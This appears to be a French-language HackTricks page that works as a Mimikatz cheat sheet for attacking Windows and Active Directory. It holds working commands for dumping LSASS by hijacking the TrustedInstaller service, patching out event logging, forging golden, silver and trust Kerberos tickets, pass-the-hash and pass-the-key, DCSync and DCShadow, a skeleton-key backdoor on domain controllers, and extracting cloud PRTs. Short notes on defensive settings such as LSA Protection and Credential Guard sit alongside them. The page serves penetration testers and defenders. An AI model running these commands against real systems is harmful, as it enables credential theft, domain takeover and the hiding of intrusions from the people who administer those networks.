# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Cette page est basée sur une page de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consultez l’original pour plus d’informations !

## LM and Clear-Text in memory

À partir de Windows 8.1 et Windows Server 2012 R2, des mesures importantes ont été mises en place pour protéger contre le vol d’identifiants :

- **LM hashes and plain-text passwords** ne sont plus stockés en mémoire afin d’améliorer la sécurité. Un paramètre de registre spécifique, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ doit être configuré avec une valeur DWORD de `0` pour désactiver Digest Authentication, garantissant que les mots de passe en "clear-text" ne sont pas mis en cache dans LSASS.

- **LSA Protection** est introduite pour protéger le processus Local Security Authority (LSA) contre la lecture mémoire non autorisée et l’injection de code. Cela est réalisé en marquant LSASS comme un processus protégé. L’activation de LSA Protection implique :
1. Modifier le registre à _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` sur `dword:00000001`.
2. Mettre en place un Group Policy Object (GPO) qui impose ce changement de registre sur les appareils gérés.

Malgré ces protections, des outils comme Mimikatz peuvent contourner LSA Protection à l’aide de drivers spécifiques, bien que de telles actions soient probablement enregistrées dans les logs d’événements.

Sur les stations de travail modernes, cela est encore plus important car **Credential Guard est activé par défaut sur de nombreux systèmes Windows 11 22H2+ et Windows Server 2025 joints au domaine et non-DC**, tandis que **LSASS-as-PPL est activé par défaut sur les nouvelles installations de Windows 11 22H2+**. En pratique, cela signifie que `sekurlsa::logonpasswords` fournit souvent moins d’informations que ce à quoi les anciennes techniques s’attendaient, et les opérateurs se tournent de plus en plus vers les **offline minidumps**, l’**extraction de clés Kerberos (`sekurlsa::ekeys`)**, ou des modules orientés **CloudAP/PRT**. Pour la partie protection, voir [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Les administrateurs ont généralement SeDebugPrivilege, ce qui leur permet de déboguer des programmes. Ce privilège peut être restreint afin d’empêcher les vidages mémoire non autorisés, une technique courante utilisée par les attaquants pour extraire des identifiants depuis la mémoire. Cependant, même avec ce privilège supprimé, le compte TrustedInstaller peut toujours effectuer des vidages mémoire en utilisant une configuration de service personnalisée :
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Cela permet de dumper la mémoire de `lsass.exe` dans un fichier, qui peut ensuite être analysé sur un autre système pour extraire des credentials:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

La falsification des journaux d’événements dans Mimikatz implique deux actions principales : effacer les journaux d’événements et patcher le service Event pour empêcher l’enregistrement de nouveaux événements. Voici les commandes pour effectuer ces actions :

#### Clearing Event Logs

- **Command**: Cette action vise à supprimer les journaux d’événements, ce qui rend plus difficile le suivi des activités malveillantes.
- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer directement les journaux d’événements via sa ligne de commande. Cependant, la manipulation des journaux d’événements implique généralement l’utilisation d’outils système ou de scripts en dehors de Mimikatz pour effacer des journaux spécifiques (par exemple, en utilisant PowerShell ou Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Cette commande expérimentale est conçue pour modifier le comportement du service de journalisation des événements, empêchant ainsi l’enregistrement de nouveaux événements.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- La commande `privilege::debug` garantit que Mimikatz fonctionne avec les privilèges nécessaires pour modifier les services système.
- La commande `event::drop` patch ensuite le service de journalisation des événements.

### Kerberos Ticket Attacks

Utilisez les commandes ci-dessous comme rappels rapides de syntaxe. Les pages dédiées aux [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), et [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contiennent les nuances AES/PAC/opsec à jour.

### Golden Ticket Creation

Un Golden Ticket permet une usurpation d’accès à l’échelle du domaine. Commande et paramètres clés :

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Le nom du domaine.
- `/sid`: Le Security Identifier (SID) du domaine.
- `/user`: Le nom d’utilisateur à usurper.
- `/krbtgt`: Le hash NTLM du compte de service KDC du domaine.
- `/ptt`: Injecte directement le ticket en mémoire.
- `/ticket`: Enregistre le ticket pour une utilisation ultérieure.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Création de Silver Ticket

Les Silver Tickets donnent accès à des services spécifiques. Commande et paramètres clés :

- Commande : similaire à Golden Ticket mais cible des services spécifiques.
- Paramètres :
- `/service` : le service à cibler (par ex. cifs, http).
- Autres paramètres similaires à Golden Ticket.

Exemple :
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Création de Trust Ticket

Les Trust Tickets sont utilisés pour accéder à des ressources entre domaines en exploitant les relations de confiance. Commande et paramètres clés :

- Commande : similaire à Golden Ticket mais pour les relations de confiance.
- Paramètres :
- `/target` : le FQDN du domaine cible.
- `/rc4` : le hash NTLM du compte de confiance.

Exemple :
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Commandes Kerberos supplémentaires

- **Lister les Tickets** :

- Commande : `kerberos::list`
- Liste tous les tickets Kerberos pour la session utilisateur actuelle.

- **Pass the Cache** :

- Commande : `kerberos::ptc`
- Injecte des tickets Kerberos depuis des fichiers cache.
- Exemple : `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket** :

- Commande : `kerberos::ptt`
- Permet d’utiliser un ticket Kerberos dans une autre session.
- Exemple : `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purger les Tickets** :
- Commande : `kerberos::purge`
- Efface tous les tickets Kerberos de la session.
- Utile avant d’utiliser des commandes de manipulation de tickets pour éviter les conflits.

### Over-Pass-the-Hash / Pass-the-Key

Si `RC4` est désactivé ou peu fiable, Mimikatz peut patcher des **clés Kerberos AES128/AES256** dans la session de connexion actuelle au lieu d’utiliser uniquement un hash NT. C’est généralement mieux adapté aux domaines modernes que de traiter `sekurlsa::pth` comme limité à NTLM.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` réutilise le processus actuel au lieu d’en lancer une nouvelle console, ce qui est pratique lorsque vous voulez exécuter immédiatement des éléments comme `lsadump::dcsync` dans le même contexte.

### Active Directory Tampering

- **DCShadow**: Fait temporairement d’une machine un DC pour la manipulation d’objets AD. Voir [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Simule un DC pour demander les données de mot de passe. Voir [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extrait les credentials depuis LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Impersonate un DC en utilisant les données de mot de passe d’un compte machine.

- _Aucune commande spécifique fournie pour NetSync dans le contexte original._

- **LSADUMP::SAM**: Accède à la base de données SAM locale.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Déchiffre les secrets stockés dans le registre.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Définit un nouveau hash NTLM pour un utilisateur.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Récupère les informations d’authentification de trust.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Sur les hôtes **Entra ID** ou **hybrid-joined**, `sekurlsa::cloudap` peut exposer le **Primary Refresh Token (PRT)** mis en cache depuis LSASS. Si la clé Proof-of-Possession associée est protégée par logiciel, `dpapi::cloudapkd` peut dériver le matériel de clé clair/dérivé nécessaire pour les workflows **Pass-the-PRT** ultérieurs.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Cela devient beaucoup plus difficile lorsque la clé est basée sur TPM, mais cela vaut la peine de vérifier sur les endpoints hybrides, car les données CloudAP mises en cache peuvent être plus intéressantes que la sortie classique de `wdigest`. Pour la chaîne d’abus côté cloud, voir [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Injecter une backdoor dans LSASS sur un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Obtenir les droits de sauvegarde.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtenir les privilèges de debug.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Afficher les credentials des utilisateurs connectés.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraire les tickets Kerberos depuis la mémoire.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Modifier SID et SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Aucune commande spécifique fournie pour modify dans le contexte original._

- **TOKEN::Elevate**: Usurper des tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Autoriser plusieurs sessions RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lister les sessions TS/RDP.
- _Aucune commande spécifique fournie pour TS::Sessions dans le contexte original._

### Vault

- Extraire les passwords depuis Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
